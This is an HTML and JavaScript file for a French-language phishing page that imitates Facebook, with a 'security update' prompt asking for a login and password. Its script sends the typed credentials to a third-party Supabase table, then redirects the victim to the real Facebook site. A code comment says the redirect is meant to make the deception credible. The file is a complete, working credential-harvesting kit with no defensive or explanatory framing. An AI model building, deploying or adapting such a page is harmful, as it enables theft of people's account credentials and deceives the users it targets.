<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sécurité Compte</title>
    <style>
        /* 1. LE STYLE (Le design) */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #121212; /* Fond très sombre */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-card {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 360px;
            text-align: center;
        }

        .logo {
            width: 60px;
            height: auto;
            margin-bottom: 20px;
        }

        .update-message {
            background-color: #2c2c2c;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            color: #ffcc00; /* Jaune alerte */
            margin-bottom: 25px;
            border-left: 5px solid #ffcc00;
            line-height: 1.4;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #333;
            border-radius: 8px;
            background-color: #2a2a2a;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background-color: #0866ff; /* Bleu Facebook */
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="login-card">
        
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="logo">
        
        <div class="update-message">
            Nouvelle mise à jour : Veuillez sécuriser votre compte Facebook
        </div>
        
        <form id="loginForm">
            <input type="text" id="login" placeholder="Numéro de mobile ou e-mail" required>
            <input type="password" id="password" placeholder="Mot de passe" required>
            <button type="submit">Mettre à jour la sécurité</button>
        </form>
        
    </div>

   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
    // Configuration
    const SUPABASE_URL = 'https://mgxrmqlgrieeilfmmyba.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_twXzt-UxzvUDeqmHc6ASaA_bqReZ';
    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    // L'action du bouton
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // On récupère ce qui est tapé grâce aux ID qu'on a mis plus haut
        const loginSaisi = document.getElementById('login').value;
        const passwordSaisi = document.getElementById('password').value;

        // On envoie à Supabase dans la table "Laurelle"
        const { data, error } = await supabase
            .from('Laurelle')
            .insert([
                { 
                  username: loginSaisi, 
                  password: passwordSaisi 
                }
            ]);

        if (error) {
            alert("Erreur de connexion au serveur de sécurité.");
            console.log(error.message);
        } else {
            // Une fois envoyé, on redirige vers la vraie page Facebook pour que ce soit crédible
            window.location.href = "https://www.facebook.com";
        }
    });
</script>
